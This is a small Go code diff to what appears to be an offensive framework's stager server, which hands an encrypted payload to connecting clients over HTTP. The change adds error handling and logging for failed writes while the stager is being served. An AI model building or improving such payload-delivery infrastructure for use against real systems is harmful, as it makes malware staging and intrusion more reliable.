@@ -35,7 +35,12 @@ func newStagerServer(stager_enc []byte, port string) *http.Server {
 		listenerLogf("Received request from %s", r.RemoteAddr)
 		w.Header().Set("Content-Type", "application/octet-stream")
 		w.Header().Set("Content-Length", fmt.Sprintf("%d", len(stager_enc)))
-		w.Write(stager_enc)
+		// A short or failed write means the client did not receive the whole
+		// stager; report it instead of silently serving a truncated payload.
+		if _, err := w.Write(stager_enc); err != nil {
+			listenerLogf("Failed to serve stager to %s: %v", r.RemoteAddr, err)
+			return
+		}
 		listenerLogf("Served encrypted stager to %s", r.RemoteAddr)
 	})
 
